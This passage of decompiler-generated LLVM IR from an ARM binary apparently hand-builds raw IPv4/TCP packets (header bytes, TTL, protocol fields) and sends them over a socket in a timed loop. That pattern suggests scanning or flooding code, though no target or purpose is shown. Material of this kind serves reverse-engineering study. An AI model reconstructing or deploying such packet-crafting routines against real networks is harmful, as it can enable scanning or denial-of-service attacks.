  br i1 %v7_bbf4, label %dec_label_pc_c044, label %dec_label_pc_bc00

dec_label_pc_bc00:                                ; preds = %dec_label_pc_bbe4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_bc08 = call i32 @function_11a2c(i32 %v3_bbf0, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_bc10 = or i32 %v2_bc08, 2048
  store i32 %v1_bc10, i32* @r2, align 4
  %v0_bc14 = load i32, i32* @r7, align 4
  store i32 %v0_bc14, i32* %r0.global-to-local, align 4
  %v2_bc18 = call i32 @function_11a2c(i32 %v0_bc14, i32 4)
  store i32 %v2_bc18, i32* %r0.global-to-local, align 4
  %v3_bc1c = load i32, i32* %stack_var_-40, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_bc2c = mul i32 %v3_bc1c, 24
  store i32 %v5_bc2c, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  store i32 2, i32* %stack_var_-60, align 4
  %v2_bc3c = add i32 %v5_bc2c, %arg2
  store i32 %v2_bc3c, i32* %r2.global-to-local, align 4
  %v1_bc40 = add i32 %v2_bc3c, 20
  %v2_bc40 = inttoptr i32 %v1_bc40 to i8*
  %v3_bc40 = load i8, i8* %v2_bc40, align 1
  %v4_bc40 = zext i8 %v3_bc40 to i32
  store i32 %v4_bc40, i32* %r3.global-to-local, align 4
  %v2_bc44 = icmp ugt i8 %v3_bc40, 30
  %v7_bc44 = icmp eq i8 %v3_bc40, 31
  store i1 %v7_bc44, i1* %cpsr_z.global-to-local, align 1
  %v2_bc48 = xor i1 %v7_bc44, true
  %v3_bc48 = and i1 %v2_bc44, %v2_bc48
  %v5_bc48 = add i32 %v2_bc3c, 16
  %v6_bc48 = inttoptr i32 %v5_bc48 to i32*
  %v7_bc48 = load i32, i32* %v6_bc48, align 4
  br i1 %v3_bc48, label %dec_label_pc_bcb4, label %dec_label_pc_bc54

dec_label_pc_bc54:                                ; preds = %dec_label_pc_bc00
  store i32 %v7_bc48, i32* @r4, align 4
  %v0_bc58 = call i32 @function_e978()
  store i32 %v0_bc58, i32* %r0.global-to-local, align 4
  %v3_bc5c = load i32, i32* %stack_var_-40, align 4
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v5_bc68 = mul i32 %v3_bc5c, 24
  %v0_bc6c = load i32, i32* @r4, align 4
  %v2_bc70 = add i32 %v5_bc68, %arg2
  store i32 %v2_bc70, i32* %r1.global-to-local, align 4
  %v1_bc74 = and i32 %v0_bc6c, 65280
  store i32 %v1_bc74, i32* %r3.global-to-local, align 4
  %v1_bc6c = udiv i32 %v0_bc6c, 256
  %v3_bc78 = and i32 %v1_bc6c, 65280
  store i32 %v3_bc78, i32* %r2.global-to-local, align 4
  %v3_bc7c = mul i32 %v0_bc6c, 16777216
  store i32 %v3_bc7c, i32* %ip.global-to-local, align 4
  %v1_bc80 = add i32 %v2_bc70, 20
  %v2_bc80 = inttoptr i32 %v1_bc80 to i8*
  %v3_bc80 = load i8, i8* %v2_bc80, align 1
  %v4_bc80 = zext i8 %v3_bc80 to i32
  store i32 %v4_bc80, i32* %lr.global-to-local, align 4
  %v4_bc84 = mul nuw nsw i32 %v1_bc74, 256
  %v5_bc84 = or i32 %v4_bc84, %v3_bc7c
  store i32 %v5_bc84, i32* %ip.global-to-local, align 4
  %v2_bc8c = call i32 @llvm.bswap.i32(i32 %v0_bc6c)
  %v7_bc90 = lshr i32 %v0_bc58, %v4_bc80
  %v8_bc90 = add i32 %v7_bc90, %v2_bc8c
  store i32 %v8_bc90, i32* %r2.global-to-local, align 4
  %v3_bc9c = mul i32 %v8_bc90, 16777216
  %v1_bca0 = and i32 %v8_bc90, 65280
  store i32 %v1_bca0, i32* %r0.global-to-local, align 4
  %v4_bca4 = mul nuw nsw i32 %v1_bca0, 256
  %v5_bca4 = or i32 %v4_bca4, %v3_bc9c
  store i32 %v5_bca4, i32* %r1.global-to-local, align 4
  %v2_bcac = call i32 @llvm.bswap.i32(i32 %v8_bc90)
  br label %dec_label_pc_bcb4

dec_label_pc_bcb4:                                ; preds = %dec_label_pc_bc00, %dec_label_pc_bc54
  %storemerge25 = phi i32 [ %v2_bcac, %dec_label_pc_bc54 ], [ %v7_bc48, %dec_label_pc_bc00 ]
  store i32 %v3_bb6c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_bcc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_bcc0, label %dec_label_pc_bdd4, label %dec_label_pc_bcc8

dec_label_pc_bcc8:                                ; preds = %dec_label_pc_bcb4
  store i32 %v8_bbb8, i32* %ip.global-to-local, align 4
  store i32 %v5_bcd4, i32* %r3.global-to-local, align 4
  store i32 %v3_bcd893, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_bce4

dec_label_pc_bce4:                                ; preds = %dec_label_pc_bdd4, %dec_label_pc_bcc8
  %stack_var_-57.0 = phi i8 [ %v1_bddc, %dec_label_pc_bdd4 ], [ %v1_bcdc, %dec_label_pc_bcc8 ]
  %storemerge = phi i8 [ %v1_bdd4, %dec_label_pc_bdd4 ], [ %v1_bce0, %dec_label_pc_bcc8 ]
  store i32 %v2_bce4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_bcec = load i32, i32* @r7, align 4
  store i32 %v0_bcec, i32* %r0.global-to-local, align 4
  %v4_bcf0 = call i32 @function_1223c(i32 %v0_bcec, %sockaddr* nonnull %v3_bcf0, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_bcf8 = call i32 @function_11dc0(i32* null)
  store i32 %v2_bcf8, i32* %r0.global-to-local, align 4
  store i32 %v2_bcf8, i32* @r4, align 4
  %v9_bd58 = icmp eq i32 %tmp32, %storemerge25
  %v4_bd7c = zext i8 %storemerge to i32
  %v4_bd80 = zext i8 %stack_var_-57.0 to i32
  %. = zext i1 %v9_bd58 to i32
  %v9_bd6c = icmp eq i1 %v9_bd58, false
  %v4_bd88 = mul nuw nsw i32 %v4_bd80, 256
  %v5_bd88 = or i32 %v4_bd88, %v4_bd7c
  %v9_bd8c = icmp eq i32 %v5_bd88, %v5_bd84
  br label %dec_label_pc_bd14

dec_label_pc_bd04:                                ; preds = %.thread23, %dec_label_pc_bd74, %dec_label_pc_bda4, %bb75
  %v2_bd04 = call i32 @function_11dc0(i32* null)
  %v0_bd08 = load i32, i32* @r4, align 4
  %v2_bd08 = sub i32 %v2_bd04, %v0_bd08
  store i32 %v2_bd08, i32* %r0.global-to-local, align 4
  %v7_bd0c = icmp eq i32 %v2_bd08, 10
  store i1 %v7_bd0c, i1* %cpsr_z.global-to-local, align 1
  %v8_bd10 = icmp sgt i32 %v2_bd08, 10
  br i1 %v8_bd10, label %dec_label_pc_bdb8, label %dec_label_pc_bd14

dec_label_pc_bd14:                                ; preds = %dec_label_pc_bd04, %dec_label_pc_bce4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 16, i32* %stack_var_-44, align 4
  store i32 %v2_bd20, i32* %lr.global-to-local, align 4
  store i32 %v2_bd24, i32* %ip.global-to-local, align 4
  store i32 %v2_bd28, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_bb68, i32* %r0.global-to-local, align 4
  %v7_bd3c = call i32 @function_1231c(i32 %v3_bb68, i32* nonnull %stack_var_-332, i32 256, i32 16384, i32 %v2_bd20, i32 %v2_bd24)
  store i32 %v7_bd3c, i32* %r2.global-to-local, align 4
  %v7_bd44 = icmp eq i32 %v7_bd3c, -1
  store i1 %v7_bd44, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_bd44, label %dec_label_pc_bdcc, label %dec_label_pc_bd50

dec_label_pc_bd50:                                ; preds = %dec_label_pc_bd14
  store i32 %tmp32, i32* %r3.global-to-local, align 4
  store i32 %., i32* %r1.global-to-local, align 4
  %v7_bd64 = icmp eq i32 %v7_bd3c, 40
  store i1 %v7_bd64, i1* %cpsr_z.global-to-local, align 1
  %tmp99 = icmp ult i32 %v7_bd3c, 41
  br i1 %tmp99, label %.thread23, label %bb75

.thread23:                                        ; preds = %dec_label_pc_bd50
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_bd04

bb75:                                             ; preds = %dec_label_pc_bd50
  store i1 %v9_bd6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bd6c, label %dec_label_pc_bd04, label %dec_label_pc_bd74

dec_label_pc_bd74:                                ; preds = %bb75
  store i32 %v4_bd78, i32* %r1.global-to-local, align 4
  store i32 %v4_bd7c, i32* %ip.global-to-local, align 4
  store i32 %v4_bd80, i32* %r2.global-to-local, align 4
  store i32 %v5_bd84, i32* %r3.global-to-local, align 4
  store i32 %v5_bd88, i32* @r5, align 4
  store i1 %v9_bd8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bd8c, label %dec_label_pc_bd94, label %dec_label_pc_bd04

dec_label_pc_bd94:                                ; preds = %dec_label_pc_bd74
  store i32 %v4_bd94, i32* %r2.global-to-local, align 4
  store i32 %v1_bd98, i32* %r3.global-to-local, align 4
  store i1 %v2_bd9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bd9c, label %dec_label_pc_bde8, label %dec_label_pc_bda4

dec_label_pc_bda4:                                ; preds = %dec_label_pc_bd94
  store i1 %v2_bda4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bda4, label %dec_label_pc_bd04, label %dec_label_pc_bdac

dec_label_pc_bdac:                                ; preds = %dec_label_pc_bda4
  %v0_bdac = load i32, i32* @r7, align 4
  store i32 %v0_bdac, i32* %r0.global-to-local, align 4
  %v1_bdb0 = call i32 @function_11af0(i32 %v0_bdac)
  store i32 %v1_bdb0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bbd4

dec_label_pc_bdb8:                                ; preds = %dec_label_pc_bd04
  %v0_bdb8 = load i32, i32* @r7, align 4
  store i32 %v0_bdb8, i32* %r0.global-to-local, align 4
  %v1_bdbc = call i32 @function_11af0(i32 %v0_bdb8)
  store i32 %v1_bdbc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bbe4

dec_label_pc_bdc4:                                ; preds = %dec_label_pc_bb80
  store i32 %v3_bb68, i32* %r0.global-to-local, align 4
  %v1_bdc8 = call i32 @function_11af0(i32 %v3_bb68)
  store i32 %v1_bdc8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bdcc

dec_label_pc_bdcc:                                ; preds = %dec_label_pc_bd14, %dec_label_pc_b998, %dec_label_pc_bdc4
  %v29_bdd0 = phi i32 [ %v3_bb68, %dec_label_pc_b998 ], [ %v1_bdc8, %dec_label_pc_bdc4 ], [ 0, %dec_label_pc_bd14 ]
  ret i32 %v29_bdd0

dec_label_pc_bdd4:                                ; preds = %dec_label_pc_bcb4
  %v0_bdd4 = call i32 @function_e978()
  %v1_bdd4 = trunc i32 %v0_bdd4 to i8
  store i32 %v0_bdd4, i32* %r0.global-to-local, align 4
  %v4_bdd8 = sdiv i32 %v0_bdd4, 256
  store i32 %v4_bdd8, i32* %r3.global-to-local, align 4
  %v1_bddc = trunc i32 %v4_bdd8 to i8
  br label %dec_label_pc_bce4

dec_label_pc_bde8:                                ; preds = %dec_label_pc_bd94
  %v3_bde8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_bde8, i32* @r4, align 4
  store i32 %v2_b9b8, i32* %r2.global-to-local, align 4
  %v3_bdf0 = mul i32 %v3_bde8, 16
  store i32 %v3_bdf0, i32* %ip.global-to-local, align 4
  %v3_bdf4 = add i32 %v3_bdf0, %v2_b9b8
  %v4_bdf4 = inttoptr i32 %v3_bdf4 to i32*
  store i32 %storemerge25, i32* %v4_bdf4, align 4
  %v0_bdf8 = load i32, i32* @r6, align 4
  %v1_bdf8 = add i32 %v0_bdf8, 4
  %v2_bdf8 = inttoptr i32 %v1_bdf8 to i32*
  %v3_bdf8 = load i32, i32* %v2_bdf8, align 4
  store i32 %v3_bdf8, i32* %r0.global-to-local, align 4
  %v1_be00 = and i32 %v3_bdf8, 65280
  store i32 %v1_be00, i32* %r1.global-to-local, align 4
  store i32 %v2_b9b8, i32* %lr.global-to-local, align 4
  %v3_be08 = mul i32 %v3_bdf8, 16777216
  %v4_be10 = mul nuw nsw i32 %v1_be00, 256
  %v5_be10 = or i32 %v4_be10, %v3_be08
  store i32 %v5_be10, i32* %r2.global-to-local, align 4
  %v1_be18 = load i32, i32* %ip.global-to-local, align 4
  %v2_be18 = add i32 %v1_be18, %v2_b9b8
  store i32 %v2_be18, i32* %ip.global-to-local, align 4
  %v2_be1c = call i32 @llvm.bswap.i32(i32 %v3_bdf8)
  store i32 %v2_be1c, i32* %r3.global-to-local, align 4
  %v2_be20 = add i32 %v2_be18, 4
  %v3_be20 = inttoptr i32 %v2_be20 to i32*
  store i32 %v2_be1c, i32* %v3_be20, align 4
  %v0_be24 = load i32, i32* @r6, align 4
  %v1_be24 = add i32 %v0_be24, 8
  %v2_be24 = inttoptr i32 %v1_be24 to i32*
  %v3_be24 = load i32, i32* %v2_be24, align 4
  store i32 %v3_be24, i32* %r0.global-to-local, align 4
  %v1_be2c = and i32 %v3_be24, 65280
  store i32 %v1_be2c, i32* %r1.global-to-local, align 4
  %v3_be30 = mul i32 %v3_be24, 16777216
  %v4_be38 = mul nuw nsw i32 %v1_be2c, 256
  %v5_be38 = or i32 %v4_be38, %v3_be30
  store i32 %v5_be38, i32* %r2.global-to-local, align 4
  %v2_be40 = call i32 @llvm.bswap.i32(i32 %v3_be24)
  store i32 %v2_be40, i32* %r3.global-to-local, align 4
  %v1_be44 = load i32, i32* %ip.global-to-local, align 4
  %v2_be44 = add i32 %v1_be44, 8
  %v3_be44 = inttoptr i32 %v2_be44 to i32*
  store i32 %v2_be40, i32* %v3_be44, align 4
  %v0_be48 = load i32, i32* @r6, align 4
  %v1_be48 = inttoptr i32 %v0_be48 to i32*
  %v2_be48 = load i32, i32* %v1_be48, align 4
  %v3_be4c = udiv i32 %v2_be48, 65536
  store i32 %v3_be4c, i32* %r2.global-to-local, align 4
  %v3_be503 = udiv i32 %v2_be48, 16777216
  store i32 %v3_be503, i32* %r1.global-to-local, align 4
  %v0_be54 = load i32, i32* @r5, align 4
  %v3_be54 = sdiv i32 %v0_be54, 256
  store i32 %v3_be54, i32* %r3.global-to-local, align 4
  %v1_be58 = trunc i32 %v3_be54 to i8
  %v2_be58 = load i32, i32* %ip.global-to-local, align 4
  %v3_be58 = add i32 %v2_be58, 15
  %v4_be58 = inttoptr i32 %v3_be58 to i8*
  store i8 %v1_be58, i8* %v4_be58, align 1
  %v0_be5c = load i32, i32* %r1.global-to-local, align 4
  %v1_be5c = trunc i32 %v0_be5c to i8
  %v2_be5c = load i32, i32* %ip.global-to-local, align 4
  %v3_be5c = add i32 %v2_be5c, 13
  %v4_be5c = inttoptr i32 %v3_be5c to i8*
  store i8 %v1_be5c, i8* %v4_be5c, align 1
  %v0_be60 = load i32, i32* %r2.global-to-local, align 4
  %v1_be60 = trunc i32 %v0_be60 to i8
  %v2_be60 = load i32, i32* %ip.global-to-local, align 4
  %v3_be60 = add i32 %v2_be60, 12
  %v4_be60 = inttoptr i32 %v3_be60 to i8*
  store i8 %v1_be60, i8* %v4_be60, align 1
  %v0_be64 = load i32, i32* @r5, align 4
  %v1_be64 = trunc i32 %v0_be64 to i8
  %v2_be64 = load i32, i32* %ip.global-to-local, align 4
  %v3_be64 = add i32 %v2_be64, 14
  %v4_be64 = inttoptr i32 %v3_be64 to i8*
  store i8 %v1_be64, i8* %v4_be64, align 1
  %v0_be68 = load i32, i32* @sl, align 4
  store i32 %v0_be68, i32* %r0.global-to-local, align 4
  %v1_be6c = call i32 @function_12578(i32 %v0_be68)
  store i32 %v1_be6c, i32* %r0.global-to-local, align 4
  store i32 %v2_b9c8, i32* %r1.global-to-local, align 4
  %v3_be74 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_be74, i32* %r2.global-to-local, align 4
  %v2_be78 = load i32, i32* @r4, align 4
  %v5_be78 = mul i32 %v2_be78, 4
  %v6_be78 = add i32 %v5_be78, %v2_b9c8
  %v7_be78 = inttoptr i32 %v6_be78 to i32*
  store i32 %v1_be6c, i32* %v7_be78, align 4
  %v0_be7c = load i32, i32* %r1.global-to-local, align 4
  %v1_be7c = load i32, i32* %r2.global-to-local, align 4
  %v4_be7c = mul i32 %v1_be7c, 4
  %v5_be7c = add i32 %v4_be7c, %v0_be7c
  %v6_be7c = inttoptr i32 %v5_be7c to i32*
  %v7_be7c = load i32, i32* %v6_be7c, align 4
  store i32 %v7_be7c, i32* @r4, align 4
  %v1_be80 = inttoptr i32 %v7_be7c to i8*
  %v2_be80 = load i8, i8* %v1_be80, align 1
  %tmp100 = urem i8 %v2_be80, 16
  %v1_be84 = zext i8 %tmp100 to i32
  %v1_be88 = or i32 %v1_be84, 64
  store i32 %v1_be88, i32* %r3.global-to-local, align 4
  %v1_be8c = trunc i32 %v1_be88 to i8
  store i8 %v1_be8c, i8* %v1_be80, align 1
  %v0_be90 = load i32, i32* @r4, align 4
  %v1_be90 = inttoptr i32 %v0_be90 to i8*
  %v2_be90 = load i8, i8* %v1_be90, align 1
  store i32 %v3_bbb0, i32* %ip.global-to-local, align 4
  %v1_be9c = and i8 %v2_be90, -16
  %v1_bea4 = or i8 %v1_be9c, 5
  store i32 %v5_bea8, i32* %r0.global-to-local, align 4
  %v0_beac = load i32, i32* @sl, align 4
  %v3_beac = mul i32 %v0_beac, 65536
  store i32 %v3_beac, i32* %r2.global-to-local, align 4
  store i32 %v1_ba48, i32* %lr.global-to-local, align 4
  store i8 %v1_bea4, i8* %v1_be90, align 1
  store i32 %v4_beb8, i32* %r1.global-to-local, align 4
  %v0_bebc = load i32, i32* %r2.global-to-local, align 4
  %v3_bebc = udiv i32 %v0_bebc, 65536
  %v1_bec0 = urem i32 %v3_bebc, 256
  store i32 %v1_bec0, i32* %r3.global-to-local, align 4
  %v3_bec4 = udiv i32 %v0_bebc, 16777216
  store i32 %v3_bec4, i32* %r2.global-to-local, align 4
  %v2_bec8 = load i32, i32* @r4, align 4
  %v3_bec8 = add i32 %v2_bec8, 1
  %v4_bec8 = inttoptr i32 %v3_bec8 to i8*
  store i8 %v1_bec8, i8* %v4_bec8, align 1
  %v0_becc = load i32, i32* %r2.global-to-local, align 4
  %v1_becc = load i32, i32* %r3.global-to-local, align 4
  %v4_becc = mul i32 %v1_becc, 256
  %v5_becc = or i32 %v4_becc, %v0_becc
  store i32 %v5_becc, i32* %r2.global-to-local, align 4
  %v1_bed0 = trunc i32 %v0_becc to i8
  %v2_bed0 = load i32, i32* @r4, align 4
  %v3_bed0 = add i32 %v2_bed0, 2
  %v4_bed0 = inttoptr i32 %v3_bed0 to i8*
  store i8 %v1_bed0, i8* %v4_bed0, align 1
  %v0_bed4 = load i32, i32* %lr.global-to-local, align 4
  %v2_bed4 = icmp eq i32 %v0_bed4, 0
  store i1 %v2_bed4, i1* %cpsr_z.global-to-local, align 1
  %v0_bed8 = load i32, i32* %r2.global-to-local, align 4
  %v3_bed8 = sdiv i32 %v0_bed8, 256
  store i32 %v3_bed8, i32* %r3.global-to-local, align 4
  store i32 %v4_bedc, i32* %r2.global-to-local, align 4
  %v1_bee0 = trunc i32 %v3_bed8 to i8
  %v2_bee0 = load i32, i32* @r4, align 4
  %v3_bee0 = add i32 %v2_bee0, 3
  %v4_bee0 = inttoptr i32 %v3_bee0 to i8*
  store i8 %v1_bee0, i8* %v4_bee0, align 1
  %v0_bee4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bee4, label %bb77, label %bb76

bb76:                                             ; preds = %dec_label_pc_bde8
  store i32 64, i32* %r3.global-to-local, align 4
  br label %bb77

bb77:                                             ; preds = %dec_label_pc_bde8, %bb76
  %v0_bee8 = load i32, i32* %r2.global-to-local, align 4
  %v1_bee8 = trunc i32 %v0_bee8 to i8
  %v2_bee8 = load i32, i32* @r4, align 4
  %v3_bee8 = add i32 %v2_bee8, 8
  %v4_bee8 = inttoptr i32 %v3_bee8 to i8*
  store i8 %v1_bee8, i8* %v4_bee8, align 1
  %v0_beec = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_beec, label %.thread6, label %bb78

bb78:                                             ; preds = %bb77
  %v1_beec = load i32, i32* %r3.global-to-local, align 4
  %v2_beec = trunc i32 %v1_beec to i8
  %v3_beec = load i32, i32* @r4, align 4
  %v4_beec = add i32 %v3_beec, 6
  %v5_beec = inttoptr i32 %v4_beec to i8*
  store i8 %v2_beec, i8* %v5_beec, align 1
  %v0_bef0.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bef0.pr, label %.thread6, label %bb79

bb79:                                             ; preds = %bb78
  store i32 0, i32* %r2.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %bb77, %bb78, %bb79
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_bef8 = load i32, i32* @r4, align 4
  %v3_bef8 = add i32 %v2_bef8, 9
  %v4_bef8 = inttoptr i32 %v3_bef8 to i8*
  store i8 6, i8* %v4_bef8, align 1
  %v0_befc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_befc, label %bb81, label %bb80

bb80:                                             ; preds = %.thread6
  %v1_befc = load i32, i32* %r2.global-to-local, align 4
  %v2_befc = trunc i32 %v1_befc to i8
  %v3_befc = load i32, i32* @r4, align 4
  %v4_befc = add i32 %v3_befc, 7
  %v5_befc = inttoptr i32 %v4_befc to i8*
  store i8 %v2_befc, i8* %v5_befc, align 1
  br label %bb81

bb81:                                             ; preds = %.thread6, %bb80
  %v2_bf04 = load i32, i32* @global_var_1cb1c.49, align 4
  store i32 %v2_bf04, i32* %r3.global-to-local, align 4
  %v0_bf08 = load i32, i32* %r0.global-to-local, align 4
  %v3_bf08 = sdiv i32 %v0_bf08, 256
  store i32 %v3_bf08, i32* %ip.global-to-local, align 4
  %v1_bf0c = load i32, i32* @r4, align 4
  %v2_bf0c = add i32 %v1_bf0c, 12
  %v3_bf0c = inttoptr i32 %v2_bf0c to i32*
  store i32 %v2_bf04, i32* %v3_bf0c, align 4
  %v0_bf10 = load i32, i32* %ip.global-to-local, align 4
  %v1_bf10 = trunc i32 %v0_bf10 to i8
  %v2_bf10 = load i32, i32* @r4, align 4
  %v3_bf10 = add i32 %v2_bf10, 5
  %v4_bf10 = inttoptr i32 %v3_bf10 to i8*
  store i8 %v1_bf10, i8* %v4_bf10, align 1
  %v3_bf14 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_bf14, i32* %r2.global-to-local, align 4
  store i32 %v2_b9b8, i32* %ip.global-to-local, align 4
  %v4_bf1c = mul i32 %v3_bf14, 16
  %v5_bf1c = add i32 %v4_bf1c, %v2_b9b8
  %v6_bf1c = inttoptr i32 %v5_bf1c to i32*
  %v7_bf1c = load i32, i32* %v6_bf1c, align 4
  store i32 %v7_bf1c, i32* %r3.global-to-local, align 4
  %v0_bf20 = load i32, i32* %r0.global-to-local, align 4
  %v1_bf20 = trunc i32 %v0_bf20 to i8
  %v2_bf20 = load i32, i32* @r4, align 4
  %v3_bf20 = add i32 %v2_bf20, 4
  %v4_bf20 = inttoptr i32 %v3_bf20 to i8*
  store i8 %v1_bf20, i8* %v4_bf20, align 1
  %v0_bf24 = load i32, i32* %r3.global-to-local, align 4
  %v1_bf24 = load i32, i32* @r4, align 4
  %v2_bf24 = add i32 %v1_bf24, 16
  %v3_bf24 = inttoptr i32 %v2_bf24 to i32*
  store i32 %v0_bf24, i32* %v3_bf24, align 4
  %v0_bf28 = load i32, i32* %r2.global-to-local, align 4
  %v3_bf28 = mul i32 %v0_bf28, 16
  %v1_bf2c = load i32, i32* %ip.global-to-local, align 4
  %v2_bf2c = add i32 %v1_bf2c, %v3_bf28
  store i32 %v2_bf2c, i32* %r2.global-to-local, align 4
  %v1_bf30 = add i32 %v2_bf2c, 13
  %v2_bf30 = inttoptr i32 %v1_bf30 to i8*
  %v3_bf30 = load i8, i8* %v2_bf30, align 1
  %v4_bf30 = zext i8 %v3_bf30 to i32
  store i32 %v4_bf30, i32* %r1.global-to-local, align 4
  %v1_bf34 = add i32 %v2_bf2c, 12
  %v2_bf34 = inttoptr i32 %v1_bf34 to i8*
  %v3_bf34 = load i8, i8* %v2_bf34, align 1
  %v4_bf34 = zext i8 %v3_bf34 to i32
  %v4_bf38 = mul nuw nsw i32 %v4_bf30, 256
  %v5_bf38 = or i32 %v4_bf34, %v4_bf38
  store i32 %v5_bf38, i32* %r3.global-to-local, align 4
  %v2_bf3c = load i32, i32* @r4, align 4
  %v3_bf3c = add i32 %v2_bf3c, 20
  %v4_bf3c = inttoptr i32 %v3_bf3c to i8*
  store i8 %v3_bf34, i8* %v4_bf3c, align 1
  %v0_bf40 = load i32, i32* @r4, align 4
  %v1_bf40 = add i32 %v0_bf40, 20
  store i32 %v1_bf40, i32* @r6, align 4
  %v0_bf44 = load i32, i32* %r3.global-to-local, align 4
  %v3_bf44 = sdiv i32 %v0_bf44, 256
  store i32 %v3_bf44, i32* %r3.global-to-local, align 4
  %v1_bf48 = trunc i32 %v3_bf44 to i8
  %v3_bf48 = add i32 %v0_bf40, 21
  %v4_bf48 = inttoptr i32 %v3_bf48 to i8*
  store i8 %v1_bf48, i8* %v4_bf48, align 1
  %v0_bf4c = load i32, i32* @r6, align 4
  %v1_bf4c = add i32 %v0_bf4c, 13
  %v2_bf4c = inttoptr i32 %v1_bf4c to i8*
  %v3_bf4c = load i8, i8* %v2_bf4c, align 1
  %v4_bf4c = zext i8 %v3_bf4c to i32
  store i32 %v4_bf4c, i32* %r3.global-to-local, align 4
  %v0_bf50 = load i32, i32* %r2.global-to-local, align 4
  %v1_bf50 = add i32 %v0_bf50, 8
  %v2_bf50 = inttoptr i32 %v1_bf50 to i32*
  %v3_bf50 = load i32, i32* %v2_bf50, align 4
  store i32 %v3_bf50, i32* %r1.global-to-local, align 4
  %v1_bf54 = or i32 %v4_bf4c, 1
  store i32 %v1_bf54, i32* %r3.global-to-local, align 4
  %v1_bf58 = add i32 %v0_bf50, 15
  %v2_bf58 = inttoptr i32 %v1_bf58 to i8*
  %v3_bf58 = load i8, i8* %v2_bf58, align 1
  %v4_bf58 = zext i8 %v3_bf58 to i32
  store i32 %v4_bf58, i32* %ip.global-to-local, align 4
  %v1_bf5c = add i32 %v0_bf50, 14
  %v2_bf5c = inttoptr i32 %v1_bf5c to i8*
  %v3_bf5c = load i8, i8* %v2_bf5c, align 1
  %v4_bf5c = zext i8 %v3_bf5c to i32
  store i32 %v4_bf5c, i32* %r0.global-to-local, align 4
  %v2_bf60 = add i32 %v0_bf4c, 4
  %v3_bf60 = inttoptr i32 %v2_bf60 to i32*
  store i32 %v3_bf50, i32* %v3_bf60, align 4
  %v0_bf64 = load i32, i32* %r2.global-to-local, align 4
  %v1_bf64 = add i32 %v0_bf64, 4
  %v2_bf64 = inttoptr i32 %v1_bf64 to i32*
  %v3_bf64 = load i32, i32* %v2_bf64, align 4
  store i32 %v3_bf64, i32* %lr.global-to-local, align 4
  %v0_bf68 = load i32, i32* %r3.global-to-local, align 4
  %v1_bf68 = trunc i32 %v0_bf68 to i8
  %v2_bf68 = load i32, i32* @r6, align 4
  %v3_bf68 = add i32 %v2_bf68, 13
  %v4_bf68 = inttoptr i32 %v3_bf68 to i8*
  store i8 %v1_bf68, i8* %v4_bf68, align 1
  %v0_bf6c = load i32, i32* @r6, align 4
  %v1_bf6c = add i32 %v0_bf6c, 12
  %v2_bf6c = inttoptr i32 %v1_bf6c to i8*
  %v3_bf6c = load i8, i8* %v2_bf6c, align 1
  %v4_bf6c = zext i8 %v3_bf6c to i32
  store i32 %v4_bf6c, i32* %r2.global-to-local, align 4
  %v1_bf70 = add i32 %v0_bf6c, 13
  %v2_bf70 = inttoptr i32 %v1_bf70 to i8*
  %v3_bf70 = load i8, i8* %v2_bf70, align 1
  %v4_bf70 = zext i8 %v3_bf70 to i32
  %v0_bf74 = load i32, i32* %r0.global-to-local, align 4
  %v1_bf74 = load i32, i32* %ip.global-to-local, align 4
  %v4_bf74 = mul i32 %v1_bf74, 256
  %v5_bf74 = or i32 %v4_bf74, %v0_bf74
  store i32 %v5_bf74, i32* %r0.global-to-local, align 4
  %tmp101 = urem i8 %v3_bf6c, 16
  %v1_bf78 = zext i8 %tmp101 to i32
  %v3_bf7c = sdiv i32 %v5_bf74, 256
  store i32 %v3_bf7c, i32* %r1.global-to-local, align 4
  %v1_bf80 = or i32 %v1_bf78, 128
  store i32 %v1_bf80, i32* %r2.global-to-local, align 4
  %v1_bf84 = or i32 %v4_bf70, 16
  store i32 %v1_bf84, i32* %r3.global-to-local, align 4
  %v1_bf88 = trunc i32 %v3_bf7c to i8
  %v3_bf88 = add i32 %v0_bf6c, 3
  %v4_bf88 = inttoptr i32 %v3_bf88 to i8*
  store i8 %v1_bf88, i8* %v4_bf88, align 1
  %v0_bf8c = load i32, i32* %lr.global-to-local, align 4
  %v1_bf8c = load i32, i32* @r6, align 4
  %v2_bf8c = add i32 %v1_bf8c, 8
  %v3_bf8c = inttoptr i32 %v2_bf8c to i32*
  store i32 %v0_bf8c, i32* %v3_bf8c, align 4
  %v0_bf90 = load i32, i32* %r2.global-to-local, align 4
  %v1_bf90 = trunc i32 %v0_bf90 to i8
  %v2_bf90 = load i32, i32* @r6, align 4
  %v3_bf90 = add i32 %v2_bf90, 12
  %v4_bf90 = inttoptr i32 %v3_bf90 to i8*
